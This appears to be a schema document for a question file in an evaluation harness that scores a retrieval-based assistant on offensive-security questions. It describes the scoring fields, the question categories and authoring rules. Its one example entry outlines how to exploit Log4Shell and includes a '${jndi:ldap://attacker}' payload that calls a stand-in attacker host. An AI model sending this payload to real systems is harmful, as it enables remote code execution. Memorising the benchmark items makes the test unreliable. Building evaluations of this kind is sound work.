# questions.jsonl Schema

One JSON object per line. All fields are required unless marked optional.

## Fields

| Field | Type | Meaning |
|---|---|---|
| `id` | string | Stable identifier. Format: `q-NNN`. Used in result files and diffs. |
| `category` | string | One of `cve-specific`, `payload-specific`, `attack-technique`, `multi-step`, `ambiguous`. |
| `question` | string | The user-facing question. Exactly what gets passed to `RetrieveService.stream_query`. |
| `gold_chunk_substrings` | string[] | Substrings expected to appear in retrieved chunks. Case-insensitive substring match against the chunk's `meta.rel_path` OR its body text. Each substring is a separate recall point. |
| `gold_chunk_paths` | string[] | Stricter signal: substrings expected to be present in the `meta.rel_path` field of at least one retrieved chunk (within `topk`). Exact-substring match on the path component. |
| `must_mention_facts` | string[] | Substrings that should appear in the answer text. Case-insensitive substring match against the streamed `ANSWER_CHUNK` text (with `<think>` content excluded). Empty list = `fact_score` is null and excluded from aggregation. |
| `must_not_hallucinate` | string[] | Substrings that, if they appear in the answer **without also appearing in the retrieved context**, count as hallucinations. Typical contents: invented CVE numbers, fake flag names, off-by-one version strings, made-up tool behaviors. Empty list = `hallucination_penalty` is null and excluded. |
| `ideal_answer_outline` | string | Human-readable outline of the ideal answer. Not scored automatically; reserved for manual review and future LLM-as-judge passes. |
| `is_example` | bool | `true` for the 5 example/smoke questions shipped with the harness. The default runner skips these unless `--include-examples` is passed. |

## Categories

- **cve-specific** — one specific CVE, expecting the model to know primitive, trigger condition, affected versions, and verification steps.
- **payload-specific** — concrete payload (SQLi, XSS, SSTI, command injection variant, etc.) expecting the exact string or class of payload.
- **attack-technique** — MITRE ATT&CK technique-level question, expecting technique ID, sub-technique context, and tool examples.
- **multi-step** — chained operator question ("given foothold X on Y, escalate to Z"). Tests reasoning depth, not just retrieval.
- **ambiguous** — deliberately under-specified question. Tests whether the model asks for clarification vs. picks a reasonable interpretation vs. confabulates.

## Example entry

```json
{"id": "q-001", "category": "cve-specific", "question": "What's the exploitation primitive for CVE-2021-44228 and how would I verify it on a target Tomcat instance?", "gold_chunk_substrings": ["log4shell", "jndi", "${jndi:ldap"], "gold_chunk_paths": ["log4shell"], "must_mention_facts": ["JNDI", "LDAP", "${jndi:"], "must_not_hallucinate": ["CVE-2021-44229", "CVE-2021-44227"], "ideal_answer_outline": "1) Identify vulnerable endpoint; 2) Send ${jndi:ldap://attacker} payload in user-controlled header; 3) Verify with DNS callback or attacker-controlled LDAP server", "is_example": true}
```

## Authoring guidance

- `gold_chunk_paths` should be the most distinctive path fragment, not the full relative path — corpus path shapes drift between upstream pulls.
- `must_mention_facts` should be 2–5 small, factual anchors per question. Don't list synonyms — pick the canonical form the model is most likely to use.
- `must_not_hallucinate` should be plausible-but-wrong values the model might confabulate. Off-by-one CVE numbers, lookalike CWE IDs, fake flag names like `--exploit-mode`.
- One question per `id`. New questions get new IDs; never reuse a retired one.
